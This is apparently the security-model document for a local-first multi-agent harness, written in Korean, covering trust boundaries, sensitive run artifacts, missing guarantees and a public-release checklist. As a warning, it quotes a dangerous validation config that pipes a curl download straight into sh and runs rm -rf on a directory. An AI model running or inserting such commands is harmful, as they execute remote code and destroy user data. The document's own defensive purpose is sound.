# Security Model

Multi Agent Harness는 local-first 실행 도구입니다. 기본 모드에서는 대상 repo 안에서 agent CLI와 validation command를 로컬 child process로 실행합니다.

이 문서는 하네스가 무엇을 신뢰하는지, 무엇을 보장하지 않는지, 공개 또는 팀 환경에서 어떤 주의가 필요한지 정리합니다.

## Trust Boundary

하네스를 실행할 때 신뢰해야 하는 입력:

- 대상 repo의 파일
- 대상 repo의 `.harness.json`
- `agent.command`, `agent.args`, provider CLI
- `buildCommand`, `testCommand`, `validationCommands`
- shell, package manager, git hook, test runner 같은 로컬 실행 환경

신뢰하지 않는 repo나 설정 파일에서 하네스를 실행하지 마세요. `.harness.json`은 임의 명령 실행 표면입니다.

## Execution Model

기본 실행 모델:

```text
harness process
  -> agent CLI child process
  -> validation shell command
  -> logs / manifest / report artifacts
```

현재 기본 실행 모델은 강한 sandbox를 보장하지 않습니다. provider CLI가 자체 sandbox 옵션을 지원할 수는 있지만, 하네스 프로세스가 독립적인 container, VM, seccomp, network policy를 강제하는 구조는 아닙니다.

## Runtime Artifacts

`runs/`와 `.harness/`에는 민감한 정보가 남을 수 있습니다.

예시:

- 사용자 요청 원문
- agent prompt
- stdout/stderr 로그
- 절대경로
- validation output
- 실패 stack trace
- provider CLI가 출력한 token, env, secret 후보
- 변경 파일 정보나 diff 일부

이 저장소의 `.gitignore`는 `runs/`, `.harness/`, `.env`, `.env.*`를 제외하도록 설정되어 있습니다. public repo로 공개하기 전에는 실제 업무 run artifact가 포함되지 않았는지 별도로 확인해야 합니다.

## Validation Commands

`buildCommand`, `testCommand`, `validationCommands`는 validation 단계에서 로컬 shell로 실행됩니다.

다음과 같은 설정은 위험합니다.

```json
{
  "validationCommands": [
    "curl https://example.com/script.sh | sh",
    "rm -rf important-directory"
  ]
}
```

하네스는 validation command가 안전하거나 올바르다고 보장하지 않습니다. command의 안전성은 repo 소유자와 실행자가 검토해야 합니다.

## Agent Commands

내장 provider 외에 custom agent command를 설정할 수 있습니다.

```json
{
  "agent": {
    "provider": "my-agent",
    "command": "my-agent",
    "args": ["run", "--repo", "{{repo}}"]
  }
}
```

custom command와 args는 로컬 child process로 실행됩니다. 신뢰하지 않는 command를 설정하지 마세요.

## What The Harness Does Not Guarantee

하네스는 다음을 보장하지 않습니다.

- agent 결과의 정답성
- validation command의 충분성
- secret 자동 redaction
- 악성 repo에 대한 안전한 격리
- network access 차단
- 파일 시스템 write boundary
- destructive command 차단
- 실패 시 자동 rollback

이 항목들은 [Harness Engineering Roadmap](./harness-engineering-roadmap.md)의 hardening 대상으로 관리합니다.

## Public Release Checklist

공개 전 확인:

- `runs/`가 커밋 대상에 포함되지 않았는지 확인
- `.harness/`가 커밋 대상에 포함되지 않았는지 확인
- `.env`, `.env.*`가 커밋 대상에 포함되지 않았는지 확인
- 실제 업무 요청, customer data, token, secret이 문서나 테스트 fixture에 남아 있지 않은지 확인
- README에 experimental/local-first 경고가 있는지 확인
- LICENSE 정책을 결정했는지 확인

## Recommended Usage

권장:

- 본인이 신뢰하는 repo에서 실행
- dry-run으로 prompt와 manifest 생성을 먼저 확인
- validation command를 명시적으로 검토
- 중요한 repo에서는 별도 branch나 worktree에서 실행
- 공개 이슈나 외부 입력을 바로 agent request로 넘기기 전에 검토

비권장:

- 신뢰하지 않는 repo에서 실행
- 외부에서 받은 `.harness.json`을 검토 없이 실행
- `runs/` 산출물을 그대로 공유
- secret이 많은 로컬 환경에서 custom command를 검토 없이 실행
